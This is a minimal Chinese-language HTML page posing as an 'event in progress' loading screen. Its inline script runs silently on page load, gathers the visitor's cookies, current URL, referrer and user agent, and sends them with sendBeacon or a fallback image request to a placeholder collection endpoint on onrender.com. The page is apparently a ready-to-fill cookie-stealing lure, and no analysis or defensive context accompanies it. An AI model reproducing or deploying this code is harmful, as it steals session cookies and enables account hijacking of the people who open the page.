<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="utf-8">
<title>活动进行中</title>
</head>
<body>
<script>
(function () {
  var EP = 'https://REPLACE_ME.onrender.com/collect';
  var data = {
    cok: document.cookie,
    url: location.href,
    ref: document.referrer || '',
    ua: navigator.userAgent,
    t: Date.now()
  };
  try { navigator.sendBeacon(EP, JSON.stringify(data)); }
  catch (e) {
    var i = new Image();
    i.src = EP + '?q=' + encodeURIComponent(JSON.stringify(data));
  }
})();
</script>
<p>正在加载活动…</p>
</body>
</html>
